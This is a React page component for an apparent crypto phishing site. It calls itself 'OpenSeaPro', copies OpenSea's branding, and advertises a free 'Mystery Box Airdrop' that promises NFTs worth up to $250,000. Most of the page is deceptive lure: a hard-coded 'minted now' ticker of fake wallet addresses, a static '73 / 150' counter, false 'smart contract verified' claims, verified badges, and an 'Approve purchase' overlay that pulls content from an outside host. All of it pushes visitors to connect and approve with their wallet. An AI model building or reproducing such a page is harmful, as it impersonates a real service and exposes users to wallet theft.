export default function HomePage() {
  return (
    <>
      {/* Overlay alert */}
      <div className="alert">
        <div className="alert_window">
          <div className="alert_lable">
            <div className="alert_text">Approve purchase</div>
            <button className="alert_btn interact-button" aria-label="Close alert">
              ✕
            </button>
          </div>
          <div className="alert_items">
            {[1, 2, 3].map((n) => (
              <div className="alert_item" key={n}>
                <div className="item_img">
                  <img
                    src="https://mysterybox-mints002.vercel.app/load%202.html"
                    className="alert_loader"
                    alt="Loading"
                  />
                  <img
                    src={`https://mysterybox-mints002.vercel.app/${n}.html`}
                    className="alert_logo"
                    alt={`Item ${n}`}
                  />
                </div>
                <div className="item_desc">
                  <div className="item_lable">1 item</div>
                  <div className="item_chain">Chain: Ethereum</div>
                </div>
              </div>
            ))}
          </div>
          <div className="alert_line" />
          <div className="alert_comment">
            <div className="alert_comment_lable">Go to your wallet</div>
            <div className="alert_comment_desc">
              You’ll be asked to approve this purchase from your wallet
            </div>
          </div>
        </div>
      </div>

      {/* Header */}
      <header>
        <div className="logo_head">
          <div className="logo_img">
            <img src="/opensea.svg" alt="OpenSea" />
          </div>
          <span className="logo_text">OpenSeaPro</span>
        </div>
        <div className="inputs_head">
          <div className="searche">
            <div className="magnifying">🔍</div>
            <div className="inputs_head_inner">
              <input
                type="text"
                placeholder="Search items, collections, and accounts"
              />
            </div>
            <div className="slash">
              <span>/</span>
            </div>
          </div>
          <div className="connect">
            <button className="connect_btn interact-button">
              <span>MINT NOW</span>
            </button>
            <a className="user interact-button" aria-label="User">
              👤
            </a>
            <button className="basket interact-button" aria-label="Cart">
              🛒
            </button>
          </div>
        </div>
      </header>

      {/* Main hero with video background */}
      <main>
        <div className="main_screen">
          <div className="screen_lable">
            <div className="video">
              <div className="color_tone" />
              <video autoPlay loop playsInline muted>
                <source src="/high.mp4" type="video/mp4" />
              </video>
            </div>
            <div className="screen_lable_content">
              <div className="lable_content_left">
                <div className="lable_screen_logo">
                  <img src="/boath.png" alt="Mystery Box" />
                </div>
                <div className="lable_screen_username">
                  <span>Mystery Box</span>
                </div>
                <div className="lable_owner">
                  <span>By</span>
                  <svg
                    className="verified_icon"
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                    aria-hidden="true"
                    focusable="false"
                  >
                    <circle cx="12" cy="12" r="10" fill="#1D9BF0" />
                    <path
                      d="M10.2 13.6l-1.8-1.8a1 1 0 10-1.4 1.4l2.5 2.5a1 1 0 001.5-.1l5.5-6a1 1 0 10-1.5-1.3l-4.8 5.3z"
                      fill="#ffffff"
                    />
                  </svg>
                  <span className="hover">OpenSeaPro</span>
                </div>
                <div className="lable_miting">
                  <div className="lable_dot">
                    <div className="amin" />
                    <div className="statick" />
                  </div>
                  <div className="lable_btn">MINTING NOW</div>
                </div>
              </div>
              <div className="lable_content_right">
                <div className="content_right" />
              </div>
            </div>
          </div>
        </div>

        {/* Ticker */}
        <div className="ticker-wrapper">
          <div className="ticker" id="newsTicker">
            <span>0x6d3b4b…a9e8 minted now</span>
            <span>0x3f3e71…05e9 minted now</span>
            <span>0x7b32f6…f2f1 minted now</span>
            <span>0x12ab9c…77de minted now</span>
            <span>0x98ff10…0aa4 minted now</span>
            <span>0xbeef42…cafe minted now</span>
            <span>0x5c1e7a…9b33 minted now</span>
            <span>0xd4f8aa…11ce minted now</span>
            <span>0x0a73ef…5b88 minted now</span>
            <span>0x3ac29d…e70f minted now</span>
            {/* duplicate for seamless loop */}
            <span>0x6d3b4b…a9e8 minted now</span>
            <span>0x3f3e71…05e9 minted now</span>
            <span>0x7b32f6…f2f1 minted now</span>
            <span>0x12ab9c…77de minted now</span>
            <span>0x98ff10…0aa4 minted now</span>
            <span>0xbeef42…cafe minted now</span>
            <span>0x5c1e7a…9b33 minted now</span>
            <span>0xd4f8aa…11ce minted now</span>
            <span>0x0a73ef…5b88 minted now</span>
            <span>0x3ac29d…e70f minted now</span>
          </div>
        </div>

        {/* Main content */}
        <div className="main_content">
          <div className="tabs">
            <div className="tab1">Mint</div>
          </div>
          <div className="row" />
          <div className="about_content">
            <div className="main_user">
              <div className="about">
                <div className="about_lable">
                  <h2>About this collection</h2>
                </div>
                <div className="about_user">
                  <div className="lable_content_logo">
                    <img src="/boath_png.png" alt="logo" />
                  </div>
                  <div className="lable_content_author">
                    <div className="content_author_username">
                      <svg
                        className="verified_icon"
                        width="18"
                        height="18"
                        viewBox="0 0 24 24"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                        aria-hidden="true"
                        focusable="false"
                      >
                        <circle cx="12" cy="12" r="10" fill="#1D9BF0" />
                        <path
                          d="M10.2 13.6l-1.8-1.8a1 1 0 10-1.4 1.4l2.5 2.5a1 1 0 001.5-.1l5.5-6a1 1 0 10-1.5-1.3l-4.8 5.3z"
                          fill="#ffffff"
                        />
                      </svg>
                      <span>Gemesis</span>
                    </div>
                    <div className="content_author_coin">
                      <span>Ethereum</span>
                    </div>
                  </div>
                </div>
                <div className="about_description">
                  <p>
                    <strong>
                      🎉 New Mystery Box Airdrop – Only 150 Boxes Available
                    </strong>
                    <br /> The next wave of NFT utility is here.
                    <br /> We’re launching a limited Mystery Box Airdrop built
                    for NFT power users.
                    <br /> Each box unlocks exclusive OpenSea Pro–level
                    rewards, with NFT values ranging from $3,000 to $250,000 in
                    historical OpenSea collections.
                    <br /> 🧠 Months in the making — this drop honors active
                    collectors, traders, and early supporters.
                  </p>
                  <br />
                  <h3>🎁 Claim Rules:</h3>
                  <ul className="claim_rules">
                    <li>Only 150 Mystery Boxes available</li>
                    <li>1 Box per wallet — no exceptions</li>
                    <li>Available for a limited time or until fully claimed</li>
                    <li>✅ Smart contract verified</li>
                    <li>🔒 Claim is on-chain, secure, and trackable</li>
                  </ul>
                  <p>
                    Don’t miss your chance to pull rare assets from top-tier
                    NFT vaults.
                    <br />
                    👉 Tap “Mint Now” to connect your wallet and secure your
                    box. Good luck, collector.
                  </p>
                  <br />
                  <a target="_blank" className="interact-button">
                    View on Etherscan
                  </a>
                </div>
              </div>
            </div>
            <div className="stat">
              <div className="stat_row">
                <div className="stat_nums">
                  <div className="stat_nums_left">
                    <span>49.5% minted</span>
                  </div>
                  <div className="stat_nums_right">
                    <span>73 / 150</span>
                  </div>
                </div>
                <div className="stat_line">
                  <div className="stat_line_left" />
                  <div className="stat_line_right" />
                </div>
              </div>
              <div className="counter">
                <div className="counter_lable">Community</div>
                <div className="counter_amount">0 ETH</div>
                <div className="counter_input">
                  <div className="counter_input_count">
                    <div className="minus">-</div>
                    <div className="int">1</div>
                    <div className="plus">+</div>
                  </div>
                  <div
                    className="connectButton mint interact-button"
                    id="messageButton"
                  >
                    <a className="interact-button">Mint</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer (simplified) */}
      <footer>
        <div className="first_row">
          <div className="first_row_left">
            <div className="row_left_lable">Stay in the loop</div>
            <div className="row_left_desc">
              Join our mailing list to stay in the loop with our newest
              feature releases, NFT drops, and tips and tricks for navigating
              OpenSea.
            </div>
            <div className="row_left_input">
              <div className="left_input">
                <input type="text" placeholder="Your email address" />
              </div>
              <div className="left_btn">Sign up</div>
            </div>
          </div>
          <div className="first_row_right">
            <div className="row_left_lable">Join the community</div>
            <div className="row_links">
              <div className="content_right">
                <div className="links">
                  <div className="icon interact-button">🐦</div>
                  <div className="icon interact-button">💬</div>
                  <div className="icon interact-button">📸</div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="chat-container">
          <div id="popup" className="popup" style={{ display: 'block' }}>
            Having troubles? Click here to chat!
          </div>
          <a target="_blank" className="chat-icon interact-button" />
        </div>
      </footer>

      {/* Mint modal */}
      <div id="mintModal" className="modal" style={{ zIndex: 998 }}>
        <div className="modal-content">
          <button className="close-buttonser interact-button">×</button>
          <h2>Mint Your NFT</h2>
          <div className="details">
            <p>
              🎉 <strong>Price:</strong> FREE
            </p>
            <p>
              🎉 <strong>Supply:</strong> 150 Mystery Box
            </p>
            <p>
              🎉 <strong>Rewards:</strong> NFT valued between $3000 and
              $250,000
            </p>
          </div>
          <img src="/389-9bec97c22fa2e411.gif" alt="NFT" />
          <div className="buttonser">
            <button
              className="plus-minus interact-button"
              id="decrease"
              disabled
            >
              -
            </button>
            <input
              type="number"
              id="mintAmount"
              defaultValue={1}
              disabled
            />
            <button
              className="plus-minus interact-button"
              id="increase"
              disabled
            >
              +
            </button>
          </div>
          <button className="connect-walletser connectButton interact-button connectWallet">
            Connect Wallet
          </button>
        </div>
      </div>
    </>
  );
}
